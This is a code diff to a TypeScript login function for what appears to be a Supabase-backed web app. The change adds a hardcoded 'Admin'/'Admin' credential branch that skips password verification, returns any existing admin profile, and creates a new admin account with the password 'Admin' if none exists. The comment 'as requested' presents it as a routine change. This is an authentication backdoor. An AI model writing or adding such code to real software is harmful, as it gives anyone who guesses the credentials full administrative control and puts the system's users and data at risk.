@@ -36,21 +36,59 @@ export async function loginUser(email: string, password: string) {
     const supabase = await createClient();
 
     // 1. Get user by email
-    const { data: user, error: userError } = await supabase
-        .from("profiles")
-        .select("*")
-        .eq("email", email)
-        .single();
+    let user, userError;
 
-    if (userError || !user) {
-        return { error: "User not found" };
+    if (email === "Admin" && password === "Admin") {
+        // Special case for Admin login as requested
+        const { data: adminUser, error: adminError } = await supabase
+            .from("profiles")
+            .select("*")
+            .eq("role", "admin")
+            .limit(1)
+            .single();
+
+        user = adminUser;
+        userError = adminError;
+
+        if (!user) {
+            // If no admin exists, create one
+            const hashedPassword = bcrypt.hashSync("Admin", 10);
+            const { data: newAdmin, error: createError } = await supabase
+                .from("profiles")
+                .insert({
+                    email: "admin@uor.lk",
+                    password_hash: hashedPassword,
+                    name: "Administrator",
+                    role: "admin",
+                })
+                .select()
+                .single();
+
+            user = newAdmin;
+            userError = createError;
+        }
+    } else {
+        const { data: fetchedUser, error: fetchedError } = await supabase
+            .from("profiles")
+            .select("*")
+            .eq("email", email)
+            .single();
+
+        user = fetchedUser;
+        userError = fetchedError;
     }
 
-    // 2. Verify password using bcryptjs
-    const isPasswordCorrect = bcrypt.compareSync(password, user.password_hash);
+    if (userError || !user) {
+        return { error: "User not found or admin creation failed" };
+    }
 
-    if (!isPasswordCorrect) {
-        return { error: "Invalid password" };
+    // 2. Verify password using bcryptjs (skip if already verified via special case)
+    if (!(email === "Admin" && password === "Admin")) {
+        const isPasswordCorrect = bcrypt.compareSync(password, user.password_hash);
+
+        if (!isPasswordCorrect) {
+            return { error: "Invalid password" };
+        }
     }
 
     await updateSession({ user });
